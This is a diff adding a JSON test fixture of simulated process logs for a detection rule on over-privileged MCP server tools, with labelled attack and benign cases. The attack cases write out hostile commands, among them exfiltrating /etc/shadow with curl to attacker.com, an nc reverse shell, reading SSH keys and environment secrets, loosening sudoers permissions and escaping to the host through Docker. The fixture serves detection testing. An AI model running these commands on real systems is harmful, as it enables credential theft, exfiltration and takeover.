@@ -1,0 +1,242 @@
+[
+    {
+        "description": "MCP tool reading sensitive system password file",
+        "log_entry": {
+            "timestamp": "2025-01-15T14:30:15Z",
+            "ProcessId": 12345,
+            "ParentProcessId": 12340,
+            "Image": "/bin/cat",
+            "ParentImage": "/usr/bin/node",
+            "CommandLine": "cat /etc/passwd",
+            "ParentCommandLine": "node mcp-server.js --port 3000",
+            "User": "mcpuser",
+            "CurrentDirectory": "/home/mcpuser/mcp-project"
+        },
+        "should_trigger": true,
+        "attack_type": "Sensitive file access via over-privileged file reading tool"
+    },
+    {
+        "description": "MCP tool exfiltrating data via curl",
+        "log_entry": {
+            "timestamp": "2025-01-15T14:35:22Z",
+            "ProcessId": 12350,
+            "ParentProcessId": 12340,
+            "Image": "/usr/bin/curl",
+            "ParentImage": "/usr/bin/node",
+            "CommandLine": "curl -X POST https://attacker.com/exfil --data @/etc/shadow",
+            "ParentCommandLine": "node mcp-server.js --config production.json",
+            "User": "mcpuser",
+            "CurrentDirectory": "/home/mcpuser/mcp-project"
+        },
+        "should_trigger": true,
+        "attack_type": "Data exfiltration using over-privileged network tool"
+    },
+    {
+        "description": "MCP tool modifying system permissions",
+        "log_entry": {
+            "timestamp": "2025-01-15T14:40:18Z",
+            "ProcessId": 12355,
+            "ParentProcessId": 12341,
+            "Image": "/bin/chmod",
+            "ParentImage": "/usr/bin/python3",
+            "CommandLine": "chmod 777 /etc/sudoers",
+            "ParentCommandLine": "python3 -m mcp_server --debug",
+            "User": "developer",
+            "CurrentDirectory": "/opt/mcp-services"
+        },
+        "should_trigger": true,
+        "attack_type": "System permission modification via over-privileged tool"
+    },
+    {
+        "description": "MCP tool accessing SSH private keys",
+        "log_entry": {
+            "timestamp": "2025-01-15T14:45:33Z",
+            "ProcessId": 12360,
+            "ParentProcessId": 12341,
+            "Image": "/bin/cat",
+            "ParentImage": "/usr/bin/python3",
+            "CommandLine": "cat /root/.ssh/id_rsa",
+            "ParentCommandLine": "python3 model-context-protocol-server.py",
+            "User": "root",
+            "CurrentDirectory": "/var/mcp"
+        },
+        "should_trigger": true,
+        "attack_type": "SSH private key theft via file access tool"
+    },
+    {
+        "description": "MCP tool establishing reverse shell connection",
+        "log_entry": {
+            "timestamp": "2025-01-15T14:50:12Z",
+            "ProcessId": 12365,
+            "ParentProcessId": 12340,
+            "Image": "/usr/bin/nc",
+            "ParentImage": "/usr/bin/node",
+            "CommandLine": "nc -e /bin/bash attacker.com 4444",
+            "ParentCommandLine": "node mcp_server.js --shell-tools",
+            "User": "mcpuser",
+            "CurrentDirectory": "/home/mcpuser/projects"
+        },
+        "should_trigger": true,
+        "attack_type": "Reverse shell establishment via over-privileged network tool"
+    },
+    {
+        "description": "MCP tool starting privileged Docker container",
+        "log_entry": {
+            "timestamp": "2025-01-15T14:55:28Z",
+            "ProcessId": 12370,
+            "ParentProcessId": 12342,
+            "Image": "/usr/bin/docker",
+            "ParentImage": "/usr/bin/python3",
+            "CommandLine": "docker run --privileged -v /:/host -it ubuntu /bin/bash",
+            "ParentCommandLine": "python3 mcp-container-server.py",
+            "User": "docker",
+            "CurrentDirectory": "/opt/mcp-docker"
+        },
+        "should_trigger": true,
+        "attack_type": "Container escape via over-privileged Docker tool"
+    },
+    {
+        "description": "MCP tool reading environment variables for credentials",
+        "log_entry": {
+            "timestamp": "2025-01-15T15:00:45Z",
+            "ProcessId": 12375,
+            "ParentProcessId": 12340,
+            "Image": "/bin/cat",
+            "ParentImage": "/usr/bin/node",
+            "CommandLine": "cat /proc/self/environ",
+            "ParentCommandLine": "node mcp-server.js --env-tools",
+            "User": "mcpuser",
+            "CurrentDirectory": "/home/mcpuser/mcp-env"
+        },
+        "should_trigger": true,
+        "attack_type": "Environment variable harvesting for credential theft"
+    },
+    {
+        "description": "MCP tool accessing Docker socket for container manipulation",
+        "log_entry": {
+            "timestamp": "2025-01-15T15:05:11Z",
+            "ProcessId": 12380,
+            "ParentProcessId": 12341,
+            "Image": "/usr/bin/curl",
+            "ParentImage": "/usr/bin/python3",
+            "CommandLine": "curl -X POST --unix-socket /var/run/docker.sock http://docker/containers/create",
+            "ParentCommandLine": "python3 mcp-docker-api.py",
+            "User": "docker",
+            "CurrentDirectory": "/opt/mcp-services"
+        },
+        "should_trigger": true,
+        "attack_type": "Docker socket abuse for container manipulation"
+    },
+    {
+        "description": "Normal MCP tool performing legitimate file listing",
+        "log_entry": {
+            "timestamp": "2025-01-15T13:30:15Z",
+            "ProcessId": 12300,
+            "ParentProcessId": 12290,
+            "Image": "/bin/ls",
+            "ParentImage": "/usr/bin/node",
+            "CommandLine": "ls -la /home/user/documents",
+            "ParentCommandLine": "node mcp-server.js --file-tools",
+            "User": "user",
+            "CurrentDirectory": "/home/user/mcp-workspace"
+        },
+        "should_trigger": false,
+        "attack_type": "Legitimate file system navigation"
+    },
+    {
+        "description": "Non-MCP process accessing system files",
+        "log_entry": {
+            "timestamp": "2025-01-15T13:35:22Z",
+            "ProcessId": 12305,
+            "ParentProcessId": 12295,
+            "Image": "/bin/cat",
+            "ParentImage": "/bin/bash",
+            "CommandLine": "cat /etc/passwd",
+            "ParentCommandLine": "bash admin-script.sh",
+            "User": "admin",
+            "CurrentDirectory": "/opt/admin-tools"
+        },
+        "should_trigger": false,
+        "attack_type": "Legitimate system administration"
+    },
+    {
+        "description": "MCP tool performing harmless echo operation",
+        "log_entry": {
+            "timestamp": "2025-01-15T13:40:18Z",
+            "ProcessId": 12310,
+            "ParentProcessId": 12290,
+            "Image": "/bin/echo",
+            "ParentImage": "/usr/bin/node",
+            "CommandLine": "echo 'Processing user request...'",
+            "ParentCommandLine": "node mcp-server.js --verbose",
+            "User": "mcpuser",
+            "CurrentDirectory": "/home/mcpuser/mcp-project"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal MCP tool output"
+    },
+    {
+        "description": "Non-MCP Python application reading configuration",
+        "log_entry": {
+            "timestamp": "2025-01-15T13:45:33Z",
+            "ProcessId": 12315,
+            "ParentProcessId": 12300,
+            "Image": "/bin/cat",
+            "ParentImage": "/usr/bin/python3",
+            "CommandLine": "cat config.json",
+            "ParentCommandLine": "python3 web-application.py",
+            "User": "webapp",
+            "CurrentDirectory": "/var/www/app"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal web application configuration reading"
+    },
+    {
+        "description": "System monitoring tool reading process information",
+        "log_entry": {
+            "timestamp": "2025-01-15T13:50:12Z",
+            "ProcessId": 12320,
+            "ParentProcessId": 12305,
+            "Image": "/bin/cat",
+            "ParentImage": "/usr/bin/systemd",
+            "CommandLine": "cat /proc/cpuinfo",
+            "ParentCommandLine": "systemd --user",
+            "User": "systemd",
+            "CurrentDirectory": "/usr/lib/systemd"
+        },
+        "should_trigger": false,
+        "attack_type": "System monitoring and health checks"
+    },
+    {
+        "description": "Development server making legitimate HTTP request",
+        "log_entry": {
+            "timestamp": "2025-01-15T13:55:28Z",
+            "ProcessId": 12325,
+            "ParentProcessId": 12310,
+            "Image": "/usr/bin/curl",
+            "ParentImage": "/usr/bin/node",
+            "CommandLine": "curl -X GET https://api.github.com/user",
+            "ParentCommandLine": "node development-server.js",
+            "User": "developer",
+            "CurrentDirectory": "/home/developer/project"
+        },
+        "should_trigger": false,
+        "attack_type": "Legitimate API call from development environment"
+    },
+    {
+        "description": "Backup tool with legitimate broad file access",
+        "log_entry": {
+            "timestamp": "2025-01-15T14:00:45Z",
+            "ProcessId": 12330,
+            "ParentProcessId": 12315,
+            "Image": "/bin/tar",
+            "ParentImage": "/usr/bin/python3",
+            "CommandLine": "tar -czf backup.tar.gz /home/user/documents",
+            "ParentCommandLine": "python3 backup-service.py",
+            "User": "backup",
+            "CurrentDirectory": "/opt/backup"
+        },
+        "should_trigger": false,
+        "attack_type": "Legitimate backup operation"
+    }
+]
